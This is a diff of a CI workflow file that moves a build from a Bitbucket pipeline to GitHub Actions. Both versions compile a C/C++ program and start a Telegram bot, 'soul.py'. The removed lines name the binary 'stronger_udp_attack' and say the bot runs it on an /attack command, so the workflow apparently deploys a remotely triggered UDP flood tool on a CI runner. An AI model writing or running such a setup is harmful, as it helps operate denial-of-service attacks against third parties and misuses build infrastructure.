@@ -1,28 +1,36 @@
-image: python:3.8  # Using Python 3.8 image for the pipeline
+name: Compile and Run C++ and Python Bot
 
-pipelines:
-  default:
-    - step:
-        name: "Install dependencies, compile C program, and run the bot"
-        caches:
-          - pip
-        script:
-          # Install necessary Python libraries
-          - pip install --upgrade pip
-          - pip3 install pyTelegramBotAPI python-dotenv
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:  # Allow manual triggering of the workflow
 
-          # Install system dependencies for compiling C++ program and other required tools
-          - apt-get update && apt-get install -y g++ make
+jobs:
+  compile-and-run:
+    runs-on: self-hosted
 
-          # Install Python dependencies for running the bot
-          - pip install python-telegram-bot
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4  # Fetch repository content
 
-          # Compile the C program (stronger_udp_attack.c) into an executable
-          - gcc -o stronger_udp_attack stronger_udp_attack.c -pthread
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y g++ python3 python3-pip
 
-          # Make sure the compiled C program (`stronger_udp_attack`) is executable
-          - chmod +x stronger_udp_attack
+      - name: Install Python requirements
+        run: |
+          pip3 install --upgrade pip
+          pip3 install pyTelegramBotAPI python-dotenv
 
-          # Run the soul.py Telegram bot (this will listen for the /attack command)
-          # It will trigger the execution of `stronger_udp_attack` when the attack is initiated
-          - python3 soul.py
+      - name: Compile C++ Program
+        run: |
+          # Compile soulcracks.cpp into the executable 'soul'
+          g++ -std=c++14 soulcracks.cpp -o soul -pthread
+          chmod +x soul  # Make the binary executable
+
+      - name: Start Telegram Bot
+        run: |
+          # Run the Python Telegram bot script
+          python3 soul.py
